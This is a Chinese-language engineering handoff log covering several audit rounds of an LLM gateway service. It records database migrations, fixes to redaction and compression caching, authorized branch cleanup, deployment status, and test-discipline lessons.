   若照单执行，就是拿健康服务做一次无收益的重启 + 抢部署锁。判据：任何部署/清理
   授权在**真正动手的那一刻**都要重新核一次「要做的这件事现在还需要做吗」——
   授权的是**目标状态**，不是某个动作。
2. ~~**`-2` 待授权清理**~~ **已按授权全清（2026-10-15 17:5x）**：`-2`
   （`/Users/huangxt/workspace/llm-gateway-go-2`，独立 clone，执行时 HEAD 已是
   `0c8696cc6`、与 origin/main 同步）。动手前重新取证与昨日的**出入**：
   - 昨日那份「唯一未提交内容 = `tmp_mint_jwt/`」**已过时**——今天多出 4 个已跟踪
     文件的未提交改动（`VERSION`、`version.json`、`web/public/menu-config.json`、
     `web/public/version.json`），四个 mtime 全是 **2026-10-15 14:06:03**，与
     `/tmp/seamless-release-154-2647` 同刻 ⇒ 是**一次部署生成的版本号 bump**，不是
     手写 WIP。按纪律**不碰**（也不在授权范围内），留在原地；
   - `/private/tmp/lggw-s3wave-wt` 目录**已被人删掉**，只剩登记（`git worktree
     list` 标 `prunable`）→ 只 `worktree prune`；
   - `~/workspace/wt-deploy-211` 目录 mtime 停在 **2026-10-13 04:25**，两天半无任何
     改动、无进程占用 → 判定不在用。
   执行：回收站删 `wt-deploy-211` 与 `tmp_mint_jwt/`（mavis-trash，**可恢复**）→
   `worktree prune` → 逐条验合并后 `git branch -d` 删 4 条
   （`feat/deploy-211-docker` `merge-main-211` `s3-wave2-readsource` `tmp-sync`）。
   清理后 `-2` 只剩 `main`，未提交内容仅剩那 4 个版本 bump。
3. ~~**远端分支收敛**~~ **已执行（2026-10-15 17:5x）**：删前对每条**在删除瞬间**
   重验 `merge-base --is-ancestor origin/<b> origin/main`（90/90 全真，0 条未合并），
   分 5 批 `git push origin --delete`，**90/90 确认 ` - [deleted]`**，无失败。
   远端现存 8 条：`main` + 4 条受保护特殊名（`llm-gateway-go-5`、
   `main-final-20260827`、`main-merge`、`main-merge-provenance-20260903`）
   + 3 条九月未合并留置项。留置项维持原判（`2026-07-25-realtime-routing-self-heal`
   24 篇设计归档 / `fix/w5-ml-ci-runbook` / `fix/w6-monitor-docs`），待维护者裁决。
4. ~~**`go build ./...`（cgo 形态）在本机结构上不可用**~~ **已落地并上线
   （提交 `80315e0fc`，2026-10-15 实测已在 154/245 生产二进制内）**：
   详见「任务 1」的 CGO 边界一节。
5. ~~**隔离 PG 实例**~~ **已回收（2026-10-15 17:5x 实测：54999 已无监听）**。
   2026-10-14 15:3x 曾用它复跑 D1 真库判据 2/2 绿：
   `TEST_PG_URL=postgres://audit@127.0.0.1:54999/postgres?sslmode=disable CGO_ENABLED=0
   go test -tags=integration ./sql/migrations/startup -run TestMigration862 -v -count=1`。
   下轮要真库判据请按 migration_862_integration_test.go 的口径**新起**一个一次性实例
   （`initdb` + `pg_ctl -o "-p <port> -k <dir> -c listen_addresses=''"`），别去找 54999。
6. **登记待续**（上轮转来的）：`probe_direct_auth_failed` 探针失败主体与失效 sk-* key
   持有方通知；fail-open 占位符透传（96 行样本，根因未定位，需结构化日志+真实流量+发布
   授权）；601,914 行 `session_censors.original_encrypted` 全 NULL 的还原半程（要还原得给
   `db_sink.go` 加解密读取方，配密钥无用）。
7. **本机 host-first 实例**：执行时跑的是 `2.5.8.2639`（`~/kaixuan/llm-gateway-go-v2/bin`），
   活跃端口 8782。本轮未动它。
8. **211 的迁移台账与别处不同**：`schema_migrations` 里 **860+ 一条都没有**
   （`max(version)=851, count=61`），但库里 `_request_logs`、`idx_request_logs_ts`
   都在——即该库走了另一条记账路径。**下轮若要在 211 上判迁移，别拿 `schema_migrations`
   当真值**，先确认它用的是哪本账。

---

# 追加：2026-10-14 24h 审计轮 —— 迁移 863 分区形态自适应 + 211 日志轮 + 拓扑漂移登记

> 合并 `c4c93365e→ec9d2f3f0`（50 提交）+ 本轮 `9faea142a`。明细：
> `docs/audit/2026-10-14-24h审计-863分区形态自适应与211日志轮.md`。

## 本轮落地

1. **迁移 863**：`ensure_handoff_logs_partition` 存储形态自适应——211 的
   acc-pg17 是 mac mini dump→restore 血缘、无 pgcolumnar，handoff 分区以
   heap 挂载（写入无损），714 体 `am='columnar'` 硬要求使 211 每 boot 报
   P0001、未来月份 `CREATE USING columnar` 必败、promote 连带不促升
   （hot 现网 0 行，潜伏非实害；promote 的 INSERT/DELETE 单语句原子已复核，
   失败不丢数据）。863：挂对父表即合法（错父表仍 raise）、创建按
   `pg_am` 探测决定 columnar/heap、714 时区钉扎保留、文件尾自证 DO、
   down 还原 714 体。五点同步 + 通道腿（**位置必须在 714 之后**，
   intentional chain `534→714→863` 终态项）。
2. **bg tick 父表形状探测**：`ursm_node_snapshot_min` 42P17 的根因是
   **db.go boot 路径有 shape-first 探测、bg 24h tick 没有**（r1021 两路径
   政策一致同族）。`archiveSpec.parentTable` + `ensureSpecEligible`
   （relkind='p' 才促升，非分区 Info 跳过）。`NewPartitionManager` 窄接口化
   `partitionDB`——聚合器仅对 `*pgxpool.Pool` 真身构造，pgxmock 判据路径
   nil 无害（`TestPartitionManagerIncludesErrorAggregator` 改 typed-nil
   pool 保旧契约）。判据四件 + M1/M2 变异红 + 252 临时库真库电池
   （P0001 复现→863 修复→down 还原 t→幂等重放）。
3. **211 acc-pg17 慢 SQL 观测**（运维，reload-only）：
   `log_min_duration_statement=500ms`，`pg_sleep(0.6)` 探针 602ms 命中
   日志实测。pg_stat_statements 未 preload（启用需重启，不动）。
   252 共享 PG 24h 零慢 SQL 零错误（网关流量已迁 211，符合预期）。

## 拓扑漂移登记（本轮新发现，未修）

- **mac mini 本地栈整体消失**：`~/kaixuan/llm-gateway-go*`、网关进程、
  caddy、8781/8782/54318/6379 全不在（部署清理轮 02:56 还实测过 local
  readyz ready；移除发生在其后、无仓库记录）。**252 公网 upstream 的
  backup 腿（mac mini mesh IP:8782）已成死节点**——211 整机故障时公网无
  活兜底。owner 裁决：恢复本地栈或摘 backup 腿。本地 E2E 需重新走
  host-first 全量部署。
- **211 部署滞后**：容器 02:54 CST 启动（≈2598 代），r1028b/r1029/
  magpie P0/856-863/r1030/auth-mw 资产修复均未上线；迁移 860 在 211 自有
  库与 252 共享库都未跑（首次部署执行，旧二进制读改名表窗口已在 860
  deploy note 声明）。
- **URSM v2 在 211 降级 ModeOff**（`LLM_GATEWAY_SYSTEM_MONITOR_ENABLED`
  未设）——与 reconciler 未启动同族，下次 211 部署一并注入（owner 决策）。

## 判据纪律增量（第 10 条）

**迁移文件 `BEGIN;` 后必须显式 `COMMIT;`**——裸 psql 执行到 EOF 隐式回滚，
本轮第一版 down 验证因此假绿（还原因回滚未生效、探测值恒为 863 体）。
另两条量具坑：pgxmock v4 `Times(0)` 受 `fulfilled()=max(planned,1)` 限制
永不满足（「不调用」方向要换层钉）；无 `WithArgs` 期望的参数数必须与实际
调用相等（带参 Exec 需显式 `AnyArg()`）。

## 下一轮提示词（2026-10-14 轮更新）

1. ★ **211 部署积压**：r1028b→863→r1030 全部未上线（含并行会话的
   50eb3bb88 台账修复）。部署时注意：迁移 860 首跑会改 request_logs 族名
   （211 自有库独立执行；154/245 共享 252 库先部署方执行、另一方旧二进制
   读改名表短暂报错——deploy note 已声明，两台应尽快同窗部署）。
   同时注入 `LLM_GATEWAY_SYSTEM_MONITOR_ENABLED=true` 解 URSM 降级。
2. 252 公网链 backup 腿（死 mac mini）与本地栈恢复：owner 拍板后执行。
3. 隔离 PG（127.0.0.1:54999，上轮并行会话留的）若还在可直接复用真库判据。
4. 上轮遗留继续跟踪：probe_direct_auth_failed 主体、fail-open 占位符
   透传根因、601,914 行还原半程（读取方代码）。

> **r1030b（2026-10-14，提交 ec9d2f3f0，随本地 2629 / 245=2630 / 154=2631 /
> 211 docker 上线）**：多模型 tool×脱敏还原 E2E 战役（MiniMax-M3/glm-5.3/
> grok-4.6/claude-sonnet-5 × chat/responses × merge/audit × 11 目录 × 2 轮）。
> 两网关缺陷修复：① **引号包裹 marker 还原**——模型把占位符加引号回显
> （`\"{\\\"SENSITIVE:secret:1\\\"}\"`）时 loose 文法不接受内侧引号 → 还原
> miss → 输出合规整流 output_policy_blocked；修复=span 解析容忍**首尾同现**
> 一层引号（双边条件保 r1022 单侧尾引号契约——normalizePlaceholder 丢空格
> 会让无引号形态解析成垃圾类型，这是隐藏耦合）+ 前缀扣留左右独立 Trim +
> 超长释放阀。② **Responses 同轮合并**——parse_responses 把相邻
> [message, function_call] 拆成两条 assistant，MiniMax 读史错乱停止发 tool
> call；修复=并入前条 assistant（chat 线标准历史形状）。
> **部署运维缺口收口**：deploy-211-docker.sh 原缺迁移腿（deploy-seamless 有
> deploy_apply_pending_migrations）——211 库从 mac dump 恢复止于 851，新二进制
> 探测 `_request_logs_hot`（860 改名后）失败**静默降级 lite 且重启不自愈**；
> 已在脚本网关启动前加幂等序列重放（fail 硬门）。
> **判据纪律增量（承 r1030 系列）**：手写帧序列若形态走不到被测分支=假绿（释放阀第一版测试
> 普通长文本立即否定前缀、永远到不了超长分支；重写为引号跑列才红）。
> **E2E 结论**：本地有效 32/32；四台部署各自 PASS（245 MiniMax chat+grok
> responses、154 glm chat+MiniMax/claude responses、211 全模型 responses+chat，
> SSH 参数 host/username/password 真值逐字还原）。grok-4.6 chat 在 211 的
> 编造凭据残留属模型行为（r1013 契约阻断正确）。铸 key 路径：生产 admin
> 登录=`/api/auth/token`、建 key=`/api/keys`+显式 key_alias、245/154 共享
> SECRET_KEY 一个 key 两台通用。
> 详见 `docs/audit/2026-10-14-r1030b-多模型tool脱敏还原E2E战役.md`。

---

# 追加：2026-10-14 晚间 24h 审计轮 —— 标题 `$2` 错位 + liveness 停写误报

> 本 checkout `llm-gateway-go-4`。合并 `origin/main`（落后 23 + 本地 docs 领先 17）
> 后批判运行日志。明细：
> `docs/audit/2026-10-14-24h审计-标题task错位与liveness停写误报.md`。

## 本轮落地

1. **D1 `resolveSessionTitleTaskID`**：`SessionFamilyTurnsForSessionSQL` 只绑 `$1`，
   调用方传了 `tenantID` 却未挂 `t.tenant_id = $2` → pgx `unused argument: 1` →
   auto_summary 摘要已落库、标题 scope 同步永久失败（154 同会话连续 ERROR）。
   修=补 `$2` 谓词；判据源码 count==1 + 负控制。
2. **D2 `v1_write_liveness`**：S4 停写后行存在性 dead 是预期态，信号层仍每 5m
   ERROR（consecutive_dead_ticks>90）+ 端点 503。分类器三值契约不动；worker
   在 `!RequestLogsWriteEnabled()` 时映射为快照 `retired`（首 tick INFO、HTTP
   200）。门 4b 配对：写开着同形状仍 ERROR。

## 分支 / 编译

- 窗口（24h~1h）未合并子分支 **0**；远端 prune 清掉已删引用。
- `CGO_ENABLED=0 go build/vet` + security/middleware/bg/settings + installer +
  通道门全绿；本轮两包判据绿。

## 下一轮提示词（2026-10-14 晚间轮）

1. ★ **部署本轮 D1/D2**（154/245/211）：修标题同步 + 停 liveness 误报噪声。
   154 现 `2631-ec9d2f3f`、245 `2632-80315e0f`——均尚本轮修复。
2. **URSM persist collect/flush timeout**（154 持续）：共享 Redis db2 SCAN 预算，
   迁独立 `URSM_V2_REDIS_DB`（代码已支持，需维护者窗口 + 重启）。
3. **252 load≈22 + analyze_llm_gateway_table_stats mean≈170s**：产品作业，不改
   调度；data-lifecycle `pg_total_relation_size` 族 mean≈616s 随 v1 退役。
4. nvidia gateway-mode probe 502/503（direct OK）与 mac mini backup 死腿：owner
   拍板。
5. 窗口外 3 条九月远端分支留置；`-2` worktree 清分支仍待授权。

---

# 追加：2026-10-14 r1031 —— 三域批判审计（脱敏 / 压缩缓存 / 会话存储转发）

> 用户目标：核对敏感信息处理、压缩与缓存、会话存储转发的完成情况，批判式审计、
> 修问题、更新文档、提交推送。基线 `origin/main 5ec4f0f43`。
> 明细：`docs/audit/2026-10-14-三域批判审计-脱敏压缩缓存会话存储转发-r1031.md`。

## 核查结论（三域主链路真实在场，非声明态）

- **脱敏三契约成立**（逐行证据）：强制输出 gate 用 `mandatory ||` 短路
  `output_compliance.enabled` 与 owner 豁免（interceptor.go:96/:230、
  stream_compliance.go:370）；未知/残缺占位符流式+非流式均 mask-or-block；
  128MiB/413、1MiB SSE 上限在场；censor sink 经 `dbConn.Stdlib()` 接线。
- **压缩 V2 主路径自洽**：`loadV2CompressionState` 构造的 state 不带
  LastOutboundHash，diff.go:118 空 hash 跳过——无形状失配问题。
- **存储转发停写后完整**：停写门只拦宽表 SQL，`firePersistedHooks` 无条件执行
  → sessionv2mirror 持续写；旧 L3 `LastOutboundForSession` 已会话族化
  （main_v3_wiring.go:121，`_request_logs` 兜底服务镜像前历史）。

## 本轮修复（F1=P2 真 defect）

- **F1 压缩缓存 V1 回退复水 hash 形状失配**：CommitFinal 存 envelope hash，
  L2 复水经 turnReader 收下 messages-only body（`turnReader != nil ||` 短路校验，
  注释自认形状不可比）但**没改 state 残留 hash** → diff.go:118 lineage 守卫
  （09-03 d6a027169）拒绝配对 → 判新会话 → 全量重发+压缩血统重置。
  08-04 复水路径先在、09-03 守卫后加未适配形状差（「两路径政策必须一致」再犯）。
  触发面=V2 读失败窗口 × L1 逐出/重启，一轮全量重发后自愈——缓存有效性缺陷非安全问题。
  修：收 body 时校验 `st.MsgCount == countMessages(body)` 后重 derive hash
  （计数不一致=真不同轮次内容，仍落保守 mismatch 分支）。
  判据同层驱动 `BuildOutboundMessages`（非 IsNewSess、3=2+1 合并）+ 前提配对
  （计数失配不采纳、hash 不被洗写）；M1 保留旧 hash→红 / M2 去计数守卫→红。
  **顺带 `SetTurnReader` 收窄为 `TurnReaderSource` 接口**（两方法，
  *v2.TurnReader 天然满足，生产调用点不变）——此前该分支只有从未在 CI 跑过的
  真库集成测试覆盖。
- **F2 非法 `LLM_GATEWAY_SANITIZE_OUTPUT_ACTION` 静默回落 mask 补 Warn**
  （唯一消费点 goal_control.go；回落语义不变）。

## 测试门

build/vet/gofmt 绿；compression 全家 + session/v2 + mirror + sanitize +
outputcompliance/response/cache + streaming（150s）+ cmd/gateway（Sanitize/Goal/
LiteSink 抽测）全绿。**既有红**：`TestLiteRequestLogSink_*` 8 条在 CGO=0 下
（SQLite 驱动），pristine 5ec4f0f43 同红，CGO=1 通过。

## 判据纪律增量（第 11 条）

**「从未运行的判据等于没有判据」**：三域 1404 测试函数盘点出 76 个带环境门，
其中约 20-40 个在任何 CI 入口都不会真实执行（SESSION_AUDIT_REDIS_ADDR 从未在
CI 设置、replay 语料被 gitignore、`!integration`×TEST_DATABASE_URL 双重落空、
v2 三个无条件 t.Skip 死测试）。`TestStorageAuditObserveV2MetadataBodyMismatch`
恰是 F1 的观测器——存在、会红、从未被跑。审计「声称完成」要连判据的
「是否真的在跑」一起核。

## 登记不修

GeneratedTextGuard 硬编码 mask（block 若扩到摘要回写通道会打断压缩闭环，
owner 拍板）；session_censors 可逆还原无读取方（配密钥+读取端点两件一起做）；
惰性工具白名单无膨胀审计；~~v2 死测试三件~~（同日续轮收口，见下）。

## r1031 同日续轮（§五-3/§五-4 收口 + F1 续缺陷修复）

明细：审计文档同文件「续轮」节。要点：

1. **判据纪律 11 的即时实证**：审计套件首次真实执行（本机 docker 29.8 已可用，
   10-11 的「docker 缺失」记录过时）立刻红 `TestStorageAuditObserveV2MetadataBodyMismatch`
   ——r1031 上午给「计数失配」钉的保守钉子（body 保持空）与 10-02 从未运行的
   集成契约（body 必须非空）**同场景相反**。修复：L2 复水 default 分支 legacy
   兜底失败后**整体采纳 L3 自洽配对**（不混绑、反洗写原则保留、Redis-only
   字段不存活）；改写判据 `TestSessionCache_L2CountMismatchDropsStaleRedisMetadata`
   （同层 + BuildOutboundMessages 增量断言），M1/M2 变异红。修复后该集成测试连
   `--require-coherence` 强断言都过。
2. **门**：`tests/session_storage_audit_gate.sh` 接入 verify.sh（docker daemon+
   postgres:17-alpine/redis:7.4.11-alpine 在场即跑，否则显式 SKIP）。门有牙实证=
   强模式红在跨实例一致性 OBSERVATION（真实遗留：warm 实例旧 generation、双写
   回调丢更新——登记待裁决）。**跑 verify.sh 的机器从此这批判据自动在场。**
3. **死测试三件收口**：EmptySession 的 skip 理由与实现不符（`&TurnReader{}` 零值
   短路返回空，去 skip 即过）；SetGet/CacheMiss 场景并入审计套件
   `TestStorageAuditGovernanceSetGetDeleteMiss`，死版本删除。
4. **32 个落空 realdb 测试精确对账并登记**：v2 包 setupTestDB 门 34 个，CI
   `Sessions V2 integration` job（sessionforensics-ci.yml，子串正则
   `_RealDB|_RoundTrip`）覆盖 2 个中缀命名者，余 32 个零入口。一次性 PG 只应用
   430+431 实证不够（`session_bodies_hot` 614 等演进层缺失全灭）——这批测试要
   全链迁移库。收口=owner 扩宽 CI job 过滤器+补 CI 库迁移，勿在本仓 runner 里
   重建迁移执行器。
5. 判据纪律 12（候选）：**冻结现状当契约前先搜反向判据**——「保守」经常只是
   「现状」，r1031 的钉子与 10-02 的集成契约矛盾共存两周，只因两份判据从未同场
   执行。

## 下一轮提示词（r1031 轮）

1. ★ **部署 r1031**（154/245/211 随下次窗口）：F1+F1 续（同文件两修）使 V2 抖动期
   的会话压缩不再静默退化为全量重发、计数失配期不再缓存不配对组合进 L1。
2. ~~**审计测试盲区收口**~~ **同日续轮已完成**（门 + 死测试三件 + 32 个对账登记，
   见上节）；新增遗留=跨实例一致性 OBSERVATION 的两项真实缺口（warm 旧 generation/
   双写丢更新）待裁决。
3. 上一轮遗留不变：D1/D2 部署、URSM persist collect 迁独立 db、
   GeneratedTextGuard 双语义拍板、session_censors 可逆化两件套。

---

# 追加：2026-10-15 24h 审计 —— magpie P0 收口合入 + admin 慢查询根修

> 明细：`docs/audit/2026-10-15-24h审计-magpie收口与admin慢查询.md`。
> HEAD 推送后以 `git log -1` 为准（约 `ccec7c543` 一带）。

## 落地

1. **magpie P0-B/C/D**（`cursor/magpie-p0-closeout`）合入 main 并删远程分支；判据/
   观测脚本一并入库。
2. **D1** probeOne 进程级 MemoryFlight 跨测试串味 → per-Executor 惰性 memory。
3. **D2** `/api/admin/sessions/online`：旧 JOIN 停写视图 EXPLAIN **52s/0 行** →
   改读 `session_summaries`（近窗 **0.76ms**）。
4. **D3** `/api/logs/top-models`：≤8d 窗只用 `SessionFamilyTurnsHotSourceSQL`。
5. 本地已合并陈旧分支 10 条删除；24h 窗内不活跃未合并远程分支 **0**；
   `r43-fresh-install*` 窗口外留置（含删 704/705 的危险 diff）。

## 下一轮提示词（2026-10-16 复审重部署后）

> 明细：`docs/audit/2026-10-15-24h审计-magpie收口与admin慢查询.md` §八。
> 生产（2026-10-16 03:4x 复核）：245=`2664-dd0d8248`(:8782，并行会话部署) /
> 154=`2663-75bf327a`(:8782) / 211=`75bf327a-dirty-20261016-211`（docker :8781）。
> 优化轮明细见同审计文档 §九。

1. ~~commit + push 两文件~~ **已提交（2026-10-16 优化轮，同批）**。
2. ~~online 超管冷查询 >5s~~ **迁移 867 已落地**：`session_summaries
   (last_request_at DESC, session_key DESC) WHERE last_request_at IS NOT NULL`。
   252 共享库已 CONCURRENTLY 同名预建（32s/49MB），EXPLAIN 102ms/3,974 页 →
   0.22ms/19 页，245/154 端点首调 4–21ms。**大表迁移范式**：启动链单事务不能
   CONCURRENTLY ⇒ 生产先运维预建，迁移体用 `to_regclass IS NULL` 判定包住
   CREATE——PG 的 `CREATE INDEX IF NOT EXISTS` 在发现同名索引**之前**就拿
   ShareLock（一次性 PG17 实测：写事务在场时裸跑 2s 锁超时，判定块 0s）。
3. ~~211 注入 production~~ **已改脚本、未部署**：deploy-211-docker.sh 补齐
   ValidateAuthSecrets 四件（API_KEY 前缀 `gw211_`、ADMIN `ops_`、CURSOR_HMAC
   64hex，env/gateway.{apikey,adminkey,cursorhmac} 持久、重跑不轮换）+
   `LLM_GATEWAY_ENV=production`。注意：154/245 也**没设** LLM_GATEWAY_ENV，
   只是四件齐全故无告警；211 生效后 `/healthz/full` `/metrics` 等需 ops token
   （/readyz、/healthz 不受影响；实测 211 无抓取方）。
4. ~~本机 Go 升 1.27.2~~ **已完成**（见工具链表）。
5. ★ **部署待 owner 拍板**：并行会话 02:3x 合入「版本化脱敏规则管理」（61 checkpoint
   + 迁移 866，台账 pending deploy），并已把 245 部署为 `2664-dd0d8248`；154 仍
   `2663-75bf327a`、211 仍旧版。此时部署任何一台都会连带 866 与该功能。
6. MV 争用、model alternatives 超时、fp_slot、nvidia probe、252 负载 15–22：owner。
7. `r43-fresh-install*` / 九月远端三分支：留置。
8. ~~**`/live` 真实浏览器验收（未做，沙箱阻塞）**~~ —— **2026-10-18 凌晨已解除阻塞并完成**。
   原记录归因于「沙箱里 App.vue 的 `/api/auth/me` 探测不落定，dev 预览页同样卡在登录检测」，
   并据此认为必须拿到管理员口令或已登录浏览器才能验收 —— **这个前提是错的**。
   实际做法：`/dev/live-topology-preview` 带 `meta:{public:true}`，且路由门
   `shouldRedirectToBootstrap` 对 `import.meta.env.DEV && toPath.startsWith('/dev/')`
   直接放行（`web/src/router.ts:375`）。真正卡住的是**首屏那次 `/api/auth/me` 401
   把 guest 外壳的软启动判定拖住**，而 stub 没模拟那个探测的收敛——导航等它落定即可，
   之后页面完整渲染，无需任何凭据。
   环境与两条工具坑见上文「浏览器验收轮」。**已确认**（DOM 实读）：
   缓存格在 0 命中时是 `is-idle` 非故障红、放大面板被约束在右列内、
   缺省时延渲染 `—`、左栏表头计数与行数一致。
   **仍未覆盖**：~~480 断点右侧裁切~~ —— **2026-10-18 已修**（`06455178c`）：
   `TopologyCanvas.measure()` 原强制 `width>=640` 而容器 `overflow:hidden`，
   480 视口（容器 456px）下右侧 113px 被裁掉。改为用容器真实宽度、
   下限只兜退化输入，放不下的节点显式折叠成「其他 N」（流量求和，
   不静默丢弃）。同一轮还查出**同源的卡片重叠**：卡片固定 150px 而
   槽位 `spanW/(n+1)`，1440 摊 8 张时槽位 138 < 150、每张压 12px，
   1024 压 58px —— **重叠与裁切是同一类「看不见信息」的缺陷，
   而缺陷清单里原本只有裁切**（重叠读代码看不出来，得算）。
   布局判据 1 条扩到 6 条，6 处变异验证全部变红。
   **仍未覆盖**：「60fps / 粒子不卡」仍无运行时帧率证据
   （要补得用 DevTools performance 录制，单测覆盖不了）。

---

# 追加：2026-10-17 252 SQL 日志审计轮 —— UNION 恒炸洪水（24 万条）根修

> 窗口 10-16 06:47 → 10-17 06:20。产物 `docs/audit/2026-10-17-252-sql-log-audit.md`。
> 提交 `24748e233`（修复+判据），部署 245=2687-24748e23（8782）/154=2688-24748e23（8781）。

## 主缺陷（本轮修复）

**#153 批次（87499af9a）给 `admin/credential_monitor.go::slidingWindowHotQuery`
两臂加 tenant_id 投影时位置不一致**：session 臂插在 credential_id 前、v1 臂追加在
后，UNION ALL 按位置配对 → varchar/bigint **解析期恒炸**（42804）。245 上凭据监控
抽屉轮询 ~12/s 报错 8h+（252 PG 日志 23.6 万条 ERROR、ctr.log 单日 773MB=正常 2-9 倍
日志洪水），滑动窗面板全 500。修复=v1 臂列序对齐；部署后洪水归零
（06:51 起三轮采样零新增，日志增速 2-4MB/min→15KB/min）。

**事故的流程缺口**：realdb 门（`TestCredentialDrawerHotWindow_RealDB`，缺陷文本实跑
即 42804 红——本轮变异实证）是 opt-in（TEST_DATABASE_URL 未设置即 skip），#153 改了
SQL 与测试签名但从未对真库执行。已补**静态形状钉**
`TestSlidingWindowHotQueryArmsPositionallyAligned`（臂数/列数/tenant_id 与
credential_id 两臂位置一致，每次 go test 都跑）；「SQL 文本变更必过真库执行门」
的通用解另行立项。

## 本轮其余定性（无需修复）

- 慢查 1,782 条/9,927s **100% 集中在洪水窗口**（洪水前 17.5h 全库零 ≥1s 慢查——
  上轮修复后系统干净）：路由候选构建（346 次）**结构未回归**（源码重建 SQL
  EXPLAIN=83ms，R8 基线同级）、smm daily_kline 上轮 VACUUM 基线成立（洪水尖峰连坐）、
  其余为周期 worker 负载慢实例。
- 已知维持：pocket $4 双型（~80/天，owner 动作）；一次性：旧二进制调已删视图 ×2、
  人工探查 inbound_body ×4。
- **新观察项**：session_request_status_backfill 的 session_turns×_request_logs JOIN
  成本随 turns 增长单调上升（avg 22.8s/45min），登记不修；
  sliding-window 批量端点的常开轮询方身份未定位。

## 量具坑（第 11-16 条增量，详见审计文档 §六）

纯语句体行无 PG 时间戳/pid（按 pid 配对语句体全落空）；单行语句全文在 duration 行
本体上（execute S_N: 形态）；并发同文本语句体行逐行交错（采样必污染，EXPLAIN 用
源码重建为权威）；`LOG:` 后双空格（`\s?` 只吃一个→慢查 census 假 0）；ssh heredoc
sed 转义不可靠（python patch 替代）；**`~/sdk/` 工具链再次被清**——现行替代
`/opt/homebrew/bin/bash`(5.3.9)+`/opt/homebrew/bin/go`(1.27.2)，旧配方里的
`~/sdk/bash5`/`~/sdk/go` 前缀全部改用 brew 路径。

---

# 追加：2026-10-18 24h 审计轮 —— 三族真问题（已修已推）

> 窗口 10-17 06:20 → 10-18 03:55。`go build / go vet` 全绿；`CGO_ENABLED=0 go test` 覆盖
> admin/bg/domains/stats/security/streaming/outputcompliance/proxy/settings 全绿（installer 13 包
> 绿，web-mobile 9013/9014 绿，web 4 红为上游已记录门）。
> 提交 `8c4f5abbb`，已推 origin/main。

## 结论/根因

1. **`.audit-validation/` 暂存目录被 8 道门当源码扫**。9ed60bfaa（`feat(sanitize)`）
   只把 `.audit-validation/` 加进 `.gitignore`，没同步给按目录走文件树的测试门；保留
   在磁盘上的旧路径快照（`.audit-validation/trace-retirement/source/...`）被当成
   新增 bodies 读方 / 读源 / 形态未登记，触发 8 道门红（v1_bodies_read_path × 2、
   v1_bodies_reader_shapes、request_logs_read_inventory、indirect_readers、
   view_source_column_contract、view_column_contract、billing_wide_table_columns、
   internal_error_guard）。根因：判据普遍 skip `.git + docs + node_modules + vendor`，
   缺 `.audit*` 这一档。
2. **write-time 合规门在 `output_compliance.enabled=false` 默认下一律假绿**。
   9ed60bfaa 把 `output_compliance.enabled` 默认改 `false` 后，BuildRedactBodyFn
   第一行就 return 原 body，6 道门（write_time_policy_terminal × 3 协议、
   real_compliance_stream、r25_output_interception × 2、managed_write_block、
   managed_write_snapshot、chat_deferred × 2）原本是绿的实际是「短路在 enabled=false」，
   跑下来就成了绿。修法：按既有 `r1013RequireComplianceOn(t)` helper 模式显式开。
3. **web-mobile 9 处 Go 行号引用 + 4 处 CSS token 引用过期**。cmd/gateway/main.go
   在 870 迁移、批 156 等近 10 个 commit 累积下行号漂移；goLineRef 与 theme 双门
   各报 9 + 4 条。Go 行号按现 main 重校；token 引用按本仓既有约定（`app-accent →
   app-primary`、`app-surface-2 → app-surface`，注释里 ModelIQView / RequestActionsView
   都明说「本仓没有 app-accent」）。

## 改动文件与关键行为

- 8 道 test 门同源：`.audit*` 加进 skipDir 集合（统一改动到 `admin/{request_logs_*,
  view_*, billing_*, internal_error_guard*}_test.go`）。
- 6 道 output_compliance 测试入口：每个 `func TestX` 头部补 `r1013RequireComplianceOn(t)`
  一行（`domains/streaming/{write_time_policy_terminal,r25_output_interception,
  native_response_hook_integration,managed_write_block,managed_write_snapshot,
  chat_output_commit}_test.go`）。
- `web-mobile/src/api/{approvals,dispatchWaterfall,sessionAnalyticsFilterOptions,
  sessions,subscriptionTiers,subscriptionTiers.test}.ts` 注释挂的行号按现 main 校准。
- `web-mobile/src/views/{DispatchJournalView.spec,SubscriptionTiersView}.vue` 同上。
- `web-mobile/src/components/session/OnlineSessionDetailSheet.vue` 2 处 `var(--app-accent,
  var(--app-primary))` → `var(--app-primary)`（与兄弟页 ModelIQView/RequestActionsView
  注释一致）。
- `web-mobile/src/views/{AutoRouteView,OnlineSessionsView}.vue` 2 处 `var(--app-surface-2)`
  → `var(--app-surface)`。

## 测试命令与结果

```
$ export PATH="$HOME/sdk/go/bin:$PATH"
$ go build ./...        # rc=0
$ go vet ./...          # rc=0
$ CGO_ENABLED=0 go test ./settings/... ./security/... ./domains/outputcompliance/... \
                     ./domains/streaming/... ./proxy/...  # 全部 ok
$ CGO_ENABLED=0 go test ./admin/... ./bg/... ./domains/stats/...  # 全部 ok
$ cd installer && go test ./...  # 13 包全绿
$ cd web-mobile && pnpm test  # 240/240 文件 · 9013 通过 · 1 skip
$ cd web && pnpm test  # 4 红（孤儿路由 + CJK 棘轮 + i18n parity × 2，上游已记，本轮未擅自处置）
$ bash tests/deploy_host_first_contract_test.sh  # ALL PASSED
$ bash tests/deploy_timeout_portability_test.sh  # OK
$ bash scripts/apply-db-revision-sequence_test.sh  # OK (9 tests)
```

13/13 goLineRef、11/11 theme 复测全绿。

## 遗留风险（已记未修）

1. **生产 log 实测两个 ERROR 持续累积**（本机 `~/kaixuan/llm-gateway-go-v2/logs/gateway-8782.log`）：
   - `provider_error_aggregator: watermark stalled past promote retention`
     已 25h+、pre_watermark=40 条 stranded；上游 promote retention 8h，本地 25h 没自愈。
   - `candidate_failure_monitor: failure log is stale` 已 22h+，last_insert_at=2026-10-17 02:48 不动。
   两条均非本轮回归，根因需 owner 单独立项。
2. **feat/app-icon-standard 远端分支反复被 force-push 重建**（本轮已第二次删），每次
   都混着已上 main 的 revert（870 applied+verified 回退、AGENTS.md 大段删、deploy-211
   修复回退、QUICK_REFERENCE 计数回退）+ 唯一的「额外」提交也是 main 上同源修复的复制
   （bc4dc52a6 vs 9c268f2ee）。下一次再被 push，**别单独看 diff 大小，先按 AGENTS.md
   判据纪律 #5 逐文件去 main 找等价物**。若作者本意是推同源修复，应直接 cherry-pick
   main 上已合并的 SHA，不要 force-push 整分支。
3. **pristine `origin/main` 自带红门 4 条**（`main` 上 4 条 web 测试红为上游带下）：
   navCoverage（孤儿路由 `/admin/usage-enhanced`、`/admin/board-operational`）、
   hardcoded_cjk.baseline（棘轮 5566 > 5529）、i18n parity × 2。
   按 AGENTS.md「上游红门本轮如实记录、未擅自处置」，本轮不修。
